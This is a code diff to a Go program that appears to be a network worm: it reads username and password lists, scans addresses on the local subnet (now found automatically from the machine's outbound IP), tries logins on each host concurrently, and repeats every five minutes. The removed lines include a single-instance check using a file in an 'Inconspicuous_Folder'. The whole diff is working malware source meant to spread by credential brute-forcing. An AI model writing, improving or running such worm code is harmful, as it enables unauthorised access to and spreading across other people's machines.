@@ -3,8 +3,8 @@ package main
 import (
 	"runtime"
 	"os"
-	"io/ioutil"
-	"strconv"
+	//"io/ioutil"
+	//"strconv"
 	"log"
     "syscall"
 )
@@ -20,6 +20,9 @@ import (
 	"github.com/tmc/scp"
 	"github.com/syossan27/tebata"
 	"os/exec"
+	//"container/list"
+	"net"
+	"regexp"
 )
 
 func handler1() {
@@ -31,27 +34,11 @@ func handler1() {
 func main(){
     t := tebata.New(syscall.SIGINT, syscall.SIGTERM, syscall.SIGABRT, syscall.SIGKILL)
 	t.Reserve(handler1)
-	fmt.Println("test")
-
 	myos := runtime.GOOS
-
-	if myos=="windows" {
-		if _, err := os.Stat("\\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\flag.txt"); os.IsNotExist(err) {
-			ioutil.WriteFile("\\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\flag.txt",[]byte("hello"),0644)
-		} else {
-			os.Exit(3)
-		}
-	} else {
-		if _, err := os.Stat("/tmp/config-err-XJM1ll78/flag.txt"); os.IsNotExist(err) {
-			ioutil.WriteFile("/tmp/config-err-XJM1ll78/flag.txt",[]byte("hello"),0644)
-		} else {
-			os.Exit(3)
-		}
-	}
-
-	for {
-		startwormingboi(myos)
+	startwormingboi(myos)
+	for len(os.Args) == 1{
 		time.Sleep(5 * time.Minute)
+		startwormingboi(myos)
 	}
 }
 
@@ -59,28 +46,20 @@ func startwormingboi(myos string) {
 
 	var user = readinfile("user.txt")
 	var passwds = readinfile("passwds.txt")
-	var subnets = os.Args[1]
+	var subnets = ""
+	if len(os.Args) == 1 {
+		subnets = GetOutboundIP()
+	}else {
+		subnets = os.Args[1]
+	}
 	var step = readinfile("step.txt")
-
-	start, err := strconv.ParseInt(step[0], 10, 64)
-	if err != nil{
-		log.Fatal(err)
-	}
-	stop, err := strconv.ParseInt(step[1], 10, 0)
-	if err != nil{
-		log.Fatal(err)
-	}
-	stepval, err := strconv.ParseInt(step[2], 10, 0)
-	if err != nil{
-		log.Fatal(err)
-	}
 	var myip = ""
 	var wg sync.WaitGroup
-		for l := start; l <= stop; l=l+stepval{
-			myip = joinstrings(subnets,strconv.Itoa(int(l)))
+		for _,element := range step{
+			myip = joinstrings(subnets,element)
+			fmt.Println(myip)
 				wg.Add(1)
 				go gettingin(myip, user, passwds, &wg)
-
 			}
 			wg.Wait()
 	 } 
@@ -225,4 +204,17 @@ func readinfile(myfile string) (readinarr []string){
         log.Fatal(err)
     }
     return
+}
+func GetOutboundIP() (myip string) {
+	conn, err := net.Dial("udp", "8.8.8.8:80")
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer conn.Close()
+
+	localAddr := conn.LocalAddr().(*net.UDPAddr)
+	myip = localAddr.IP.String()
+	re := regexp.MustCompile(`.*\..*\.`)
+	myip = re.FindString(myip)
+	return myip
 }
